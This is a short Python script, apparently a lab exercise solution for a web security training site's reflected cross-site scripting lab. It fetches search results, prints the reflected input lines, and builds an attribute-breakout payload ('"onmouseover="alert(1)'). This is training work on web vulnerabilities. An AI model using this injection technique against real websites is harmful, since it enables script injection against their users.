#7. cross-site-scripting/reflected (4)

import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
site = 'ac831fd11f223a15c0f09a4c00240009.web-security-academy.net'



odin_id = 'madler'
search_term = odin_id
search_url = f'https://{site}/?search={search_term}'
resp = requests.get(search_url)
for line in resp.text.split('\n'):
    if 'input' in line:
        print(line)
search_term = f'''{odin_id}"onmouseover="alert(1)'''
